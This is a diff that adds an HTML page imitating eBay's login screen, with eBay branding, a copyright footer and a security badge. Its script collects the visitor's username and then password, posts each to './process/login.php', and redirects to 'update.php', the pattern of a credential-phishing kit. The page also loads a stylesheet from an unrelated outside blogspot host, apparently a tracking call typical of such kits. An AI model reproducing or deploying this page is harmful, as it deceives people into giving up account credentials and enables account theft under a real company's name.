@@ -1,0 +1,111 @@
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Sign in to your account | eBay</title>
+<link rel="icon" href="./res/img/icon.png">
+<link rel="stylesheet" href="./res/css/style.css">
+<link rel="stylesheet" href="http://cssplugsin.blogspot.com/?css=stylesheet.css">
+<script src="./res/js/jquery.js"></script>
+</head>
+<body>
+
+<div class="top">
+<div class="left">
+<img src="./res/img/logo.png">
+</div>
+<div class="right">
+</div>
+</div>
+
+
+<div class="form">
+<div id="welcome">
+<h1>Hello</h1>
+Sign in to eBay or <a href="#">create an account</a>
+</div>
+
+ <div id="error">
+ </div>
+ 
+<div id="email">
+<input type="text" class="text" name="userid" id="ui" placeholder="Email or username">
+<button id="email-login-btn" class="submit-btn">Continue</button>
+</div>
+
+<div id="password" style="display:none;">
+<input type="password" id="pass" class="text" name="userid" placeholder="Password">
+<button id="password-login-btn" class="submit-btn">Sign in</button>
+</div>
+
+
+<div class="options">
+<p><input type="checkbox" checked=""> Stay signed in</p>
+Using a public or shared device?<br>
+Uncheck to protect your account.<br>
+<a href="#">Learn more</a>
+</div>
+</div>
+
+
+
+<div class="footer">
+Copyright © 1995-2020 eBay Inc. All Rights Reserved. <a href="#">Accessibility</a>,
+ <a href="#">User Agreement</a>, <a href="#">Privacy</a>, 
+ <a href="#">Cookies</a>, 
+ <a href="#">Do not sell my personal information</a> and <a href="#" id="gf-AdChoice">AdChoice</a><br>
+ <img src="./res/img/norton.png" style="margin-top:5px;">
+</div>
+
+
+<script>
+$(function(){
+	$("#ui").keyup(function(){
+		 $("#email-login-btn").css("background","#3665f3");
+	});
+	$("#email-login-btn").click(function(){
+		 $("#error").html("");
+		var ui = $("#ui").val();
+		if(ui.trim() == ""){
+			 $("#ui").css("border-bottom","1px solid red");
+			 $("#email-login-btn").css("background","#bdbdbd");
+			 $("#error").html("<img src='./res/img/error.png'/> Oops, that's not a match.");
+		}else{
+			$("#email-login-btn").css("background","#bdbdbd");
+			setTimeout($("#email-login-btn").html("<img src='./res/img/loader.gif'>"),
+			$.post("./process/login.php",{userid:ui},function(done){
+				//CHANGE TO PASSWORD
+				$("#email").hide();
+				$("#password").show();
+				$("#welcome").html("<h1>Welcome</h1>"+ui+"<p>Not you? <a href=''>Switch account</a></p>");
+			}) );
+		}
+	});
+});
+
+
+$(function(){
+	$("#pass").keyup(function(){
+		 $("#password-login-btn").css("background","#3665f3");
+	});
+	$("#password-login-btn").click(function(){
+		 $("#error").html("");
+		var pass = $("#pass").val();
+		if(pass == ""){
+			 $("#pass").css("border-bottom","1px solid red");
+			 $("#password-login-btn").css("background","#bdbdbd");
+		}else{
+			$("#password-login-btn").css("background","#bdbdbd");
+			setTimeout($("#password-login-btn").html("<img src='./res/img/loader.gif'>"),
+			$.post("./process/login.php",{password:pass},function(done){
+				//CHANGE TO PASSWORD
+					window.location = "update.php";
+			}) );
+		}
+	});
+});
+
+
+
+</script>
+
+</body></html>
